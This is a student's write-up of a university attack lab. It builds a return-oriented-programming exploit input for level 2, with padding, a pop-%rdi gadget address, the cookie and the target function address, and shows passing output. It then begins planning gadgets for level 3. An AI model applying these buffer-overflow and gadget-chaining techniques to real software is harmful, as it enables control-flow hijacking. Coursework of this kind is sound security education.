# ROP

## level 2

Requirement : 

> You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).

According my original Phase 2 answer:

```
30 31 32 33 34 35 36 37 38 39   /* 34 characters padding */
30 31 32 33 34 35 36 37 38 39 
30 31 32 33 34 35 36 37 38 39 
30 31 32 33 
bf fa 97 b9 59       	        /* mov    $0x59b997fa,%edi  */
c3                   	        /* retq                     */
9a dc 61 55 00 00 00 00         /* return addr shellcode: 0x5561dca0 <- return ip (now) */
ec 17 40 00 00 00 00 00 0a      /* return addr touch2 */
```

I should rewrite the `mov    $0x59b997fa,%edi` instruction using the gadgets given. 

I thought of laying the value 0x59b997fa on the stack and using `pop %rdi` instruction, which is encoded `5f`. 

And I found one: `  401419:	69 c0 **5f c3** 00 00    	imul   $0xc35f,%eax,%eax`. This instruction starts at address `0x401419`, which is the code section and will not change on each run. So the gadget sharts at `0x40141b`.

Then I can easily write the following code.

```
30 31 32 33 34 35 36 37 38 39   /* 40 characters padding */
30 31 32 33 34 35 36 37 38 39 
30 31 32 33 34 35 36 37 38 39 
30 31 32 33 bf fa 97 b9 59 c3 
1b 14 40 00 00 00 00 00         /* return rop: 0x40141b */
fa 97 b9 59 00 00 00 00         /* the cookie value to be poped */
ec 17 40 00 00 00 00 00 0a      /* return addr touch2 */
```

Results:

```
ainevsia@linux:~/target1$ ./rtarget -q -i exploit-raw.rl2
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 BF FA 97 B9 59 C3 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00
```

## level 3

I think I should first make up the value `35 39 62 39 39 37 66 61` on the stack and I also need a pointer to it. How can i place the pointer on to the stack? 

Maybe `movq %rsp, %rdi` encoded `48 89 e7`, let's find:

```
    4019a0:	8d 87 48 89 c7 c3    	movq %rax, %rdi
    401a03:	8d 87 41 48 89 e0 c3  	movq %rsp, %rax
    4017b9:	48 83 c4 28          	add    $0x28,%rsp
    4017bd:	c3                   	retq   
```

OK, now i can already get the pointer to the stack. Next the challenge is how to make up the value `35 39 62 39 39 37 66 61`, whcih is `0x6166373939623935` in hex. Well it's easy, just place it in our string.

